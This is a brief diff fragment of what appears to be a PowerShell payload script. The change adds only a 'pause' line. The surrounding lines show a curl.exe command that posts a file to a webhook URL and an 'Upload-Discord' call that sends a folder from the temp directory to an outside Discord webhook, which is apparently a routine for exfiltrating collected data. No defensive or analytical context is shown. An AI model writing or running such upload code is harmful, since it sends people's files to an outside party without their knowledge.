@@ -40,3 +40,5 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$folderPath"}
+
+pause
